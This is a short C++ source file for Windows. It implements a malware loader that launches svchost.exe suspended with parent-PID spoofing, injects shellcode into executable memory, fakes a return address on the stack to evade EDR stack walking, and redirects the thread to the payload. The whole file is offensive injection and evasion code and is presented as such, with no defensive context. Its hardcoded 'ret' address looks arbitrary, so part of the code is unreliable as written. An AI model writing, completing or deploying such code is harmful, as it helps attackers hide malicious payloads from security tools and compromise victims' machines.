#include <windows.h>

// structure to hold payload info
struct PayloadConfig
{
    void *shellcode;
    size_t size;
};

// master function to execute the payload securely
BOOL ExecuteSilentPayload(DWORD targetPid, PayloadConfig config)
{
    //spawn suspended process with ppid spoofing (as developed previously)
    PROCESS_INFORMATION pi = {0};
    if (!SpawnSpoofedProcess("C:\\Windows\\System32\\svchost.exe", targetPid, &pi))
    {
        return FALSE;
    }

    //allocate memory for payload
    void *remoteMem = VirtualAllocEx(pi.hProcess, NULL, config.size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, remoteMem, config.shellcode, config.size, NULL);

    //get context to perform stack spoofing and execution redirection
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);

    // stack spoofing: push a fake return address to the stack
    // we set the stack pointer to a fake frame that points to a legit function return
    // this tricks EDR stack walking
    DWORD64 fakeReturn = 0x7FF8D000; // address of a 'ret' instruction in ntdll
    ctx.Rsp -= 8;
    WriteProcessMemory(pi.hProcess, (void *)ctx.Rsp, &fakeReturn, sizeof(DWORD64), NULL);

    //redirect execution to our payload
    ctx.Rip = (DWORD64)remoteMem;

    //apply spoofed context
    SetThreadContext(pi.hThread, &ctx);

    //resume thread to execute payload under the 'legit' stack
    ResumeThread(pi.hThread);

    return TRUE;
}
